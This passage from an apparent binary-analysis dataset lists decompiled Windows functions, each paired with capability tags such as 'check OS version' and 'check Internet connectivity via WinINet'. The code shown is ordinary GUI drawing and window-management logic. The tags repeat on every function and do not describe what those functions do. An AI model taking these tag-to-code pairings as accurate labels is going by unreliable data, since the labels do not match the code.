0x57) != '\\0') &&\n                    (((*(var_18h + 0x1c) & 0x10) == 0 || ((*(var_18h + 0x55) & 8) == 0)))) ||\n                   (((*(var_18h + 0x1c) & 0x10) != 0 &&\n                    (((*(var_18h + 0x55) & 8) == 0 && ((*(var_18h + 0x51) & 4) == 0)))))) {\n                    fcn.004181c0(&fcn.00464598::lprc, *(var_18h + 0x44) + *(var_18h + 0x4c));\n                    puStack76 = 0x4646b5;\n                    iVar1 = sub.gdi32.dll_RectVisible();\n                    if (iVar1 != 0) {\n                        if ((*(var_4h + 0x54) & 0x80) != 0) {\n                            *(var_18h + 0x54) = *(var_18h + 0x54) | 0x80;\n                        }\n                        puStack76 = hDC;\n                        puStack80 = 0x4646d8;\n                        nSavedDC = sub.gdi32.dll_SaveDC();\n                        uStack84 = 0x464745;\n                        uStack88 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffffa8;\n                        puStack80 = &stack0xfffffffc;\n                        fcn.0045d550();\n                        sub.gdi32.dll_IntersectClipRect(hDC, 0, 0, *(var_18h + 0x48), *(var_18h + 0x4c));\n                        uVar4 = 0;\n                        fcn.004601fc(0);\n                        *in_FS_OFFSET = uVar4;\n                        sub.gdi32.dll_RestoreDC(hDC, nSavedDC, 0x46474c);\n                        return;\n                    }\n                }\n                var_ch = var_ch + 1;\n            } while (var_ch < var_10h);\n        }\n    }\n    if ((*(var_4h + 0x1d0) != 0) && (iVar1 = *(*(var_4h + 0x1d0) + 8),  -1 < iVar1 + -1)) {\n        var_ch = 0;\n        do {\n            iVar2 = fcn.00419610();\n            if (((*(iVar2 + 0x1d9) != '\\0') && ((*(iVar2 + 0x50) & 0x10) != 0)) &&\n               ((((*(iVar2 + 0x1c) & 0x10) == 0 && (*(iVar2 + 0x57) != '\\0')) ||\n                ((((*(iVar2 + 0x1c) & 0x10) != 0 && ((*(iVar2 + 0x51) & 4) == 0)) && ((*(iVar2 + 0x55) & 8) == 0)))))) {\n                fcn.0042767c();\n                uVar4 = sub.gdi32.dll_CreateSolidBrush();\n                puStack76 = 0x46480e;\n                fcn.004181c0(&fcn.00464598::lprc, *(iVar2 + 0x44) + *(iVar2 + 0x4c));\n                puStack76 = &fcn.00464598::lprc;\n                puStack80 = hDC;\n                uStack84 = 0x46481b;\n                sub.user32.dll_FrameRect();\n                uStack88 = 0x464821;\n                uStack84 = uVar4;\n                sub.gdi32.dll_DeleteObject();\n                uStack88 = 0x46482b;\n                uStack88 = fcn.0042767c();\n                uVar3 = sub.gdi32.dll_CreateSolidBrush();\n                iVar2 = *(iVar2 + 0x44) + *(iVar2 + 0x4c) + 1;\n                arg_8h = &fcn.00464598::lprc;\n                uVar4 = uVar3;\n                fcn.004181c0(arg_8h, iVar2);\n                sub.user32.dll_FrameRect(hDC, &fcn.00464598::lprc, arg_8h, iVar2, uVar4);\n                sub.gdi32.dll_DeleteObject(uVar3);\n            }\n            var_ch = var_ch + 1;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 1397
    },
    "00464928": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00464928(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint32_t uVar3;\n    uint in_EDX;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    int32_t lprc;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint nSavedDC;\n    uint hdc;\n    int32_t var_4h;\n    \n    *(in_EAX + 0x54) = *(in_EAX + 0x54) | 0x80;\n    puStack48 = 0x46494a;\n    hdc = in_EDX;\n    var_4h = in_EAX;\n    nSavedDC = sub.gdi32.dll_SaveDC();\n    uStack52 = 0x464b61;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &stack0xfffffffc;\n    fcn.0045d550();\n    sub.gdi32.dll_IntersectClipRect(hdc, 0, 0, *(var_4h + 0x48), *(var_4h + 0x4c));\n    iVar5 = 0;\n    iVar4 = 0;\n    uVar2 = fcn.00466ca8(0xffffffec);\n    uVar3 = sub.user32.dll_GetWindowLongA(uVar2);\n    if ((uVar3 & 0x200) == 0) {\n        uVar2 = fcn.00466ca8(0xfffffff0);\n        uVar3 = sub.user32.dll_GetWindowLongA(uVar2);\n        if ((uVar3 & 0x800000) != 0) {\n            iVar4 = 3;\n            iVar5 = 0xa00f;\n        }\n    }\n    else {\n        iVar4 = 10;\n        iVar5 = 0x200f;\n    }\n    if (iVar4 == 10) {\n        fcn.00452050();\n        cVar1 = fcn.00452158();\n        if ((cVar1 != '\\0') && (((*(var_4h + 0x1c) & 0x10) == 0 || (cVar1 = fcn.00451ff8(),  cVar1 == '\\0')))) {\n            sub.user32.dll_SetRect(&fcn.00464928::lprc, 0, 0, *(var_4h + 0x48), *(var_4h + 0x4c));\n            if ((*(var_4h + 0x52) & 2) == 0) {\n                *(var_4h + 0x50) = *(var_4h + 0x50) | *0x464b7c;\n                fcn.00464878();\n                *(var_4h + 0x50) = ~*0x464b7c & *(var_4h + 0x50);\n            }\n            else {\n                fcn.00464878();\n            }\n            fcn.0045d550();\n            sub.gdi32.dll_IntersectClipRect(hdc, 0, 0, var_14h - lprc, var_10h - var_18h);\n            goto code_r0x00464ae1;\n        }\n    }\n    if (iVar5 != 0) {\n        sub.user32.dll_SetRect(&fcn.00464928::lprc, 0, 0, *(var_4h + 0x48), *(var_4h + 0x4c));\n        sub.user32.dll_DrawEdge(hdc, &fcn.00464928::lprc, iVar4, iVar5);\n        fcn.0045d550();\n        sub.gdi32.dll_IntersectClipRect(hdc, 0, 0, var_14h - lprc, var_10h - var_18h);\n    }\ncode_r0x00464ae1:\n    fcn.004601fc(0);\n    uVar2 = 0;\n    fcn.004601fc(0);\n    if ((*(var_4h + 0x1d0) != 0) && (iVar4 = *(*(var_4h + 0x1d0) + 8),  -1 < iVar4 + -1)) {\n        do {\n            iVar5 = fcn.00419610();\n            if (*(iVar5 + 0x57) != '\\0') {\n                uVar2 = *(iVar5 + 0x44);\n                fcn.00464928(uVar2);\n            }\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n    }\n    *in_FS_OFFSET = uVar2;\n    sub.gdi32.dll_RestoreDC(hdc, nSavedDC, 0x464b68);\n    return;\n}\n",
        "token_count": 1118
    },
    "00464f44": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00464f44(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    uint arg_ch;\n    uint arg_10h;\n    uchar auStack28 [16];\n    \n    fcn.00452050();\n    cVar1 = fcn.00452158();\n    if (((cVar1 == '\\0') || (in_EAX[0xc] == 0)) || ((*(in_EAX + 0x52) & 4) == 0)) {\n        if ((*(in_EAX + 0x90) == '\\0') || (*(param_2 + 4) == *(param_2 + 8))) {\n            uVar2 = fcn.00428438();\n            (**(*in_EAX + 0x44))(uVar2);\n            sub.user32.dll_FillRect(*(param_2 + 4), auStack28);\n        }\n    }\n    else if (*(in_EAX[0xc] + 0x240) == '\\0') {\n        arg_10h = 0;\n        arg_ch = 0;\n        uVar2 = 0;\n        fcn.00466ca8();\n        fcn.00452258(uVar2, arg_ch, arg_10h);\n    }\n    else {\n        fcn.0045bc9c();\n    }\n    *(param_2 + 0xc) = 1;\n    return;\n}\n",
        "token_count": 327
    },
    "00465514": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00465514(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint arg_8h_00;\n    int32_t iVar1;\n    \n    arg_8h_00 = fcn.004181b0();\n    iVar1 = fcn.004601fc(arg_8h_00);\n    if ((-1 < iVar1) && (*(in_EAX + 0x1e2) != 0)) {\n        (**(in_EAX + 0x1e0))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 127
    },
    "00465564": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00465564(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x1ea) != 0) {\n        (**(in_EAX + 0x1e8))(arg_8h, arg_ch, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 87
    },
    "00465694": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00465694(uint arg_8h, uint *arg_ch)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint var_8h;\n    uint uStack8;\n    \n    var_8h = *arg_ch;\n    uStack8 = arg_ch[1];\n    uVar1 = fcn.00466ca8();\n    sub.user32.dll_GetWindowRect(uVar1);\n    sub.user32.dll_InflateRect();\n    if (*(in_EAX + 0x202) != 0) {\n        (**(in_EAX + 0x200))(arg_8h, &var_8h);\n    }\n    return;\n}\n",
        "token_count": 150
    },
    "004656f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.004656f0(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar1 = fcn.0046565c();\n    if ((0 < iVar1) && (iVar3 = iVar1 + -1,  -1 < iVar3)) {\n        do {\n            iVar2 = fcn.00419610();\n            if (*(iVar2 + 0x57) == '\\0') {\n                iVar1 = iVar1 + -1;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != -1);\n    }\n    return iVar1;\n}\n",
        "token_count": 145
    },
    "004657d0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004657d0(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x465878;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if ((param_2 != *(in_EAX + 0x1dc)) && (*(in_EAX + 0x1dc) = param_2,  (*(in_EAX + 0x1c) & 0x10) == 0)) {\n        fcn.0045c850();\n        if (param_2 == '\\0') {\n            fcn.00404640();\n            *(in_EAX + 0x1ac) = 0;\n            fcn.00406f3c();\n        }\n        else {\n            if (*(in_EAX + 0x1ac) == 0) {\n                uVar1 = fcn.00404610();\n                *(in_EAX + 0x1ac) = uVar1;\n            }\n            fcn.0040483c();\n            fcn.00406f54();\n        }\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x46587f;\n    uStack28 = 0x465877;\n    fcn.00406f3c();\n    return;\n}\n",
        "token_count": 350
    },
    "00465888": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00465888(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uint *puStack48;\n    uint uStack44;\n    uint var_18h;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (*(param_2 + 0xc) == 0) {\n        iVar1 = *(param_2 + 4);\n        var_18h = *(iVar1 + 0x4c);\n        uStack24 = *(iVar1 + 0x50);\n        uStack20 = *(iVar1 + 0x54);\n        uStack16 = *(iVar1 + 0x58);\n        uStack44 = 2;\n        puStack48 = &fcn.00465888::var_18h;\n        uStack52 = 0x4658c2;\n        var_8h = param_2;\n        var_4h = in_EAX;\n        uStack52 = fcn.00466ca8();\n        uStack56 = 0;\n        puStack60 = 0x4658ca;\n        sub.user32.dll_MapWindowPoints();\n        puStack60 = 0x4658d2;\n        fcn.004628b4();\n        uStack64 = 0x46594b;\n        uStack68 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffbc;\n        puStack60 = &stack0xfffffffc;\n        fcn.0040483c();\n        if ((*(var_4h + 0x1db) != '\\0') && (*(var_4h + 0x1b0) != 0)) {\n            (**(**(var_4h + 0x1b0) + 0x18))(*(*(var_8h + 4) + 0x60));\n        }\n        *in_FS_OFFSET = uStack68;\n        puStack60 = 0x465952;\n        uStack64 = 0x46594a;\n        fcn.004628bc();\n        return;\n    }\n    return;\n}\n",
        "token_count": 523
    },
    "00465978": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00465978(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    *(param_2 + 0xc) = 0;\n    if ((*(in_EAX + 0x1db) != '\\0') && (*(in_EAX + 0x1b0) != 0)) {\n        (**(**(in_EAX + 0x1b0) + 0x28))();\n    }\n    return;\n}\n",
        "token_count": 110
    },
    "004659a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004659a0(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x4659b5;\n    iVar2 = (**(*in_EAX + 0x58))();\n    puStack24 = 0x4659bf;\n    iVar3 = fcn.00404518();\n    if (iVar2 == iVar3) {\n        cVar1 = *(in_EAX + 0x57);\n        uStack28 = 0x465a0b;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        puStack24 = &stack0xfffffffc;\n        fcn.0040483c();\n        *in_FS_OFFSET = uStack32;\n        puStack24 = 0x465a1c;\n        if (cVar1 != '\\0') {\n            uStack28 = 0x465a0a;\n            fcn.0045f1a8();\n        }\n        return;\n    }\n    puStack24 = 0x465a1c;\n    fcn.0046145c();\n    return;\n}\n",
        "token_count": 299
    },
    "00465a50": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00465a50(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uchar uVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint unaff_EBX;\n    uint uVar4;\n    int32_t iStack20;\n    \n    uVar4 = CONCAT31(unaff_EBX >> 8, 1);\n    iVar3 = fcn.00471968();\n    if ((iVar3 != 0) && (in_EAX != iVar3)) {\n        if (*(iVar3 + 0x275) != '\\0') {\n            cVar1 = fcn.00465a50();\n            if (cVar1 != '\\0') goto code_r0x00465aee;\n        }\n        if (*(iVar3 + 0x30) != 0) {\n            iStack20 = fcn.00471968();\n            if (((iStack20 != 0) && (iVar3 != iStack20)) && (*(iStack20 + 0x275) != '\\0')) {\n                cVar1 = fcn.00465a50();\n                if (cVar1 != '\\0') goto code_r0x00465aee;\n            }\n        }\n    }\n    uVar2 = fcn.00471828();\n    if ((*(in_EAX + 0x51) & 0x10) == 0) {\n        fcn.0040483c(uVar2);\n        if (*(param_2 + 4) == 0) goto code_r0x00465aee;\n    }\n    uVar4 = 0;\ncode_r0x00465aee:\n    return CONCAT44(iStack20, uVar4);\n}\n",
        "token_count": 378
    },
    "00465b7c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00465b7c(uint32_t param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint unaff_EBX;\n    uint uVar4;\n    uint32_t uStack20;\n    \n    uVar4 = CONCAT31(unaff_EBX >> 8, 1);\n    iVar3 = fcn.00471968();\n    if (((iVar3 != 0) && (in_EAX != iVar3)) && (*(iVar3 + 0x275) != '\\0')) {\n        cVar1 = fcn.00465b7c();\n        uStack20 = param_1;\n        if (cVar1 != '\\0') goto code_r0x00465bdc;\n    }\n    uVar2 = fcn.00471828();\n    uStack20 = param_1 & 0xffffff00 | uVar2;\n    if ((*(in_EAX + 0x51) & 0x10) == 0) {\n        fcn.0040483c();\n        if (*(param_2 + 4) == 0) goto code_r0x00465bdc;\n    }\n    uVar4 = 0;\ncode_r0x00465bdc:\n    return CONCAT44(uStack20, uVar4);\n}\n",
        "token_count": 304
    },
    "00465c44": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00465c44(uint32_t param_1, int32_t param_2)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint unaff_EBX;\n    uint uVar4;\n    uint32_t uStack20;\n    \n    uVar4 = CONCAT31(unaff_EBX >> 8, 1);\n    iVar3 = fcn.00471968();\n    uStack20 = param_1;\n    if (((iVar3 != 0) && (in_EAX != iVar3)) && (*(iVar3 + 0x275) != '\\0')) {\n        cVar2 = fcn.00465c44();\n        if (cVar2 != '\\0') goto code_r0x00465ca2;\n    }\n    if ((*(in_EAX + 0x51) & 0x10) == 0) {\n        uVar1 = *(param_2 + 4);\n        uStack20 = param_1 & 0xffffff00 | uVar1;\n        fcn.0040483c();\n        *(param_2 + 4) = uVar1;\n        if (*(param_2 + 4) == '\\0') goto code_r0x00465ca2;\n    }\n    uVar4 = 0;\ncode_r0x00465ca2:\n    return CONCAT44(uStack20, uVar4);\n}\n",
        "token_count": 317
    },
    "00465e9c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00465e9c(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (in_EAX[0x19] == 0) {\n        iVar1 = fcn.0045eeb4();\n        if (iVar1 < 1) {\n            iVar1 = fcn.0040a9d8();\n            in_EAX[0x19] = iVar1;\n        }\n        else {\n            iVar1 = fcn.0040a9b8();\n            in_EAX[0x19] = iVar1;\n            fcn.0040a9cc();\n            fcn.0045eec4();\n        }\n    }\n    (**(*in_EAX + -0x10))();\n    fcn.00467fe0();\n    return;\n}\n",
        "token_count": 177
    },
    "00465f1c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00465f1c(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if (((*(in_EAX + 7) & 0x10) != 0) && (in_EAX[0xc] != 0)) {\n        *(param_2 + 0xc) = 1;\n        return;\n    }\n    (**(*in_EAX + -0x10))();\n    return;\n}\n",
        "token_count": 106
    },
    "00465f40": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t __fastcall fcn.00465f40(uint param_1, uint8_t param_2)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    \n    uVar2 = fcn.0045dfb0();\n    if (*(in_EAX + 0x57) != '\\0') {\n        iVar3 = fcn.00462d98();\n        iVar3 = iVar3 + -1;\n        if (-1 < iVar3) {\n            do {\n                if ((param_2 & uVar2) != 0) break;\n                fcn.00462d5c();\n                uVar1 = fcn.0040483c();\n                uVar2 = uVar2 & 0xffffff00 | uVar2 | uVar1;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != -1);\n        }\n    }\n    return CONCAT14(param_2, uVar2);\n}\n",
        "token_count": 222
    },
    "00465ff4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00465ff4(uint param_1, int32_t param_2)\n\n{\n    fcn.00461214();\n    if ((*(*0x4a5178 + 0xd) != '\\0') && (*(param_2 + 4) == 0)) {\n        fcn.004636a0();\n    }\n    fcn.00462e28();\n    return;\n}\n",
        "token_count": 89
    },
    "0046610c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046610c(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x57) == '\\0') && (*(in_EAX + 0x30) != 0)) {\n        fcn.00462b14();\n    }\n    if (((*(in_EAX + 0x1c) & 0x10) == 0) || ((*(in_EAX + 0x51) & 4) != 0)) {\n        fcn.00463868();\n    }\n    return;\n}\n",
        "token_count": 124
    },
    "00466290": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00466290(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    if (((*(in_EAX + 0x50) & 0x10) != 0) && (*(in_EAX + 0x30) != 0)) {\n        cVar1 = fcn.00466fb4();\n        if (cVar1 != '\\0') {\n            iVar2 = sub.user32.dll_IsWindowVisible(*(in_EAX + 0x1b4));\n            if (iVar2 != 0) {\n                fcn.00466bac();\n            }\n        }\n    }\n    fcn.00462e28();\n    return;\n}\n",
        "token_count": 156
    },
    "004663d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t fcn.004663d4(void)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint uStack20;\n    \n    uVar1 = uStack20;\n    uStack20 = CONCAT31(uStack20._1_3_, 1);\n    if ((*(in_EAX + 0x1c) & 0x10) == 0) {\n        if (in_EAX != 0) {\n            do {\n                iVar3 = fcn.0040483c();\n                if ((iVar3 != 0) && (*(iVar3 + 0x38) != 0)) {\n                    cVar2 = fcn.0040483c();\n                    if (cVar2 != '\\0') goto code_r0x0046645f;\n                }\n                in_EAX = *(in_EAX + 0x30);\n            } while (in_EAX != 0);\n        }\n        iVar3 = fcn.00471968();\n        if (iVar3 != 0) {\n            cVar2 = fcn.0040483c();\n            if (cVar2 != '\\0') goto code_r0x0046645f;\n        }\n    }\n    iVar3 = fcn.0045ba30();\n    if (iVar3 == 0) {\n        uStack20 = uVar1 & 0xffffff00;\n    }\ncode_r0x0046645f:\n    return CONCAT44(uStack20, uStack20) & 0xffffffff000000ff;\n}\n",
        "token_count": 351
    },
    "00466854": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00466854(uint param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iStack32;\n    \n    iVar4 = *(in_EAX + 0x1b4);\n    if ((iVar4 == 0) || (iVar3 = sub.user32.dll_IsWindowVisible(),  iStack32 = iVar4,  iVar3 == 0)) {\n        bVar1 = false;\n    }\n    else {\n        bVar1 = true;\n    }\n    if (bVar1) {\n        sub.user32.dll_ScrollWindow(*(in_EAX + 0x1b4), iStack32, param_2, 0, 0);\n    }\n    iVar4 = fcn.00462d98();\n    if (-1 < iVar4 + -1) {\n        do {\n            iVar3 = fcn.00462d5c();\n            cVar2 = fcn.004047cc();\n            if ((cVar2 == '\\0') || (*(iVar3 + 0x1b4) == 0)) {\n                *(iVar3 + 0x40) = *(iVar3 + 0x40) + iStack32;\n                *(iVar3 + 0x44) = *(iVar3 + 0x44) + param_2;\n            }\n            else if (!bVar1) {\n                iStack32 = *(iVar3 + 0x1b4);\n                sub.user32.dll_SetWindowPos();\n            }\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n    }\n    fcn.004628dc();\n    return;\n}\n",
        "token_count": 386
    },
    "00466944": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00466944(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    \n    if (*(in_EAX + 0x30) != 0) {\n        iVar2 = *(*(in_EAX + 0x30) + 0x1cc);\n        if (iVar2 != 0) {\n            param_2 = param_2 - *(iVar2 + 8);\n        }\n        iVar2 = fcn.0041966c();\n        if (-1 < iVar2) {\n            iVar1 = *(*(*(in_EAX + 0x30) + 0x1d0) + 8);\n            if (param_2 < 0) {\n                param_2 = 0;\n            }\n            if (iVar1 <= param_2) {\n                param_2 = iVar1 + -1;\n            }\n            if (iVar2 != param_2) {\n                fcn.00419504();\n                fcn.0041968c();\n            }\n        }\n        if (*(in_EAX + 0x1b4) != 0) {\n            if (param_2 == 0) {\n                uVar3 = 1;\n            }\n            else if (param_2 == *(*(*(in_EAX + 0x30) + 0x1d0) + 8) + -1) {\n                uVar3 = 0;\n            }\n            else if (iVar2 < param_2) {\n                fcn.00419610();\n                uVar3 = fcn.00466ca8();\n            }\n            else {\n                if (iVar2 <= param_2) {\n                    return;\n                }\n                fcn.00419610();\n                uVar3 = fcn.00466ca8();\n            }\n            sub.user32.dll_SetWindowPos(*(in_EAX + 0x1b4), uVar3, 0, 0, 0, 0, 3);\n        }\n    }\n    return;\n}\n",
        "token_count": 454
    },
    "00466c84": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
